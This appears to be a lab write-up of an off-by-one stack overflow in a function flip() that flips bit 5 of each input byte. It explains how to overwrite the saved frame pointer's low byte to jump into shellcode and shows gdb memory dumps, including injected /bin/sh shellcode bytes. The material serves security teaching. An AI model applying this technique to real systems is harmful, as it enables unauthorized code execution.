The vulnerability in this question is a stack buffer overflow in the function flip(). There is an erroneous equality bounds check (i <= 64) that allows us to write 1 byte past the end of the buffer buf[64] and change the least significant byte in the fsp. I didn’t use the egg file for this problem because I was unsure of how using it would have helped me. An attacker could use this to write malicious shellcode to the system and alter the eip to point to it.

I started by reading the Off By One section in ASLR Smack & Laugh Reference. What I got from it is that by changing the least significant byte of the SFP I could get the eip to pop off a return address in the buffer. When I looked at the code, I saw that the function flip() changes the first hex in every byte that we write to the buffer. The next thing I did was to write down a table mapping bytes to their change when 1u << 5 is applied. I got {(0, 2), (1, 3), (2, 0), (3, 1), (4, 6), (5, 7), (6, 4), (7, 5), (8, a), (9, b), (a, 8), (b, 9), (c, e), (d, f), (e, c), (f, d)} and applied that to the shellcode.

(gdb) info frame
 ………
 Arglist at 0xbffff698, args: buf=0xbffff6a8 "", 
 ………

Using gdb, I found that the buffer started at 0xbffff6a8. I decided to put the shellcode at the beginning of the buffer and to fill the rest of the buffer except the last four bytes with no-ops to get four bytes before the fsp, leaving enoug space to put the address of the shellcode. This meant that the beginning of the shellcode was at 0xbffff6a8 and that I needed 15 no-ops. I used \x11 as my no-op.

After the no-ops I wrote 0xbffff6a8, the address of the beginning of the shellcode, to the last four bytes of the buffer. The last four bytes of the buffer was at 0xbffff6e4. This meant that I needed to change the fsp to 0xbffff6e0, easily achieved using the off by one attack. The original fsp was 0xbffff6f8 so I used \xe0 as the off by one attack byte to change it to 0xbffff6e0. This evenetually causes the esp to point to 0xbffff6e4, which holds the address of the beginning of the shellcode. A call to pop %eip will make the value stored at 0xbffff6e4 the next instruction so that the next instruction points to the beginning of the shellcode to get the shellcode to run. Before finishing my code, I applied the flip to all the bytes that I wanted to write to the buffer.

In the end, I wrote to the buffer the flipped shellcode, followed by 15 no-ops, followed by the flipped address of the beginning of the shellcode, followed by the flipped off by one byte in that order.

before exploit
(gdb) x/28x $esp
0xbffff680:	0x00000000	0x00000000	0x00000000	0xb7fd2000
0xbffff690:	0xbffff6de	0x00000000	0xbffff6e8	0x080483ff
0xbffff6a0:	0xbffff6a8	0xbffff8c4	0x00000000	0xb7ff3fdc
0xbffff6b0:	0xbffff764	0x00000000	0x00000000	0xb7e5f043
0xbffff6c0:	0x0804820e	0x00000000	0x2cb43048	0x00000001
0xbffff6d0:	0xbffff8ac	0x0000002f	0xbffff72c	0xb7fd2000
0xbffff6e0:	0x080484b0	0x080482f0	0xbffff6f8	0x0804841d

after exploit
(gdb) x/28x $esp
0xbffff680:	0xbffff8c4	0x00000000	0x00000000	0x00000041
0xbffff690:	0x00000041	0x00000000	0xbffff6e8	0x080483ff
0xbffff6a0:	0xbffff6a8	0xbffff8c4	0x895e1feb	0xc0310876
0xbffff6b0:	0x89074688	0x0bb00c46	0x4e8df389	0x0c568d08
0xbffff6c0:	0xdb3180cd	0xcd40d889	0xffdce880	0x622fffff
0xbffff6d0:	0x732f6e69	0x11111168	0x11111111	0x11111111
0xbffff6e0:	0x11111111	0xbffff6a8	0xbffff6e0	0x0804841d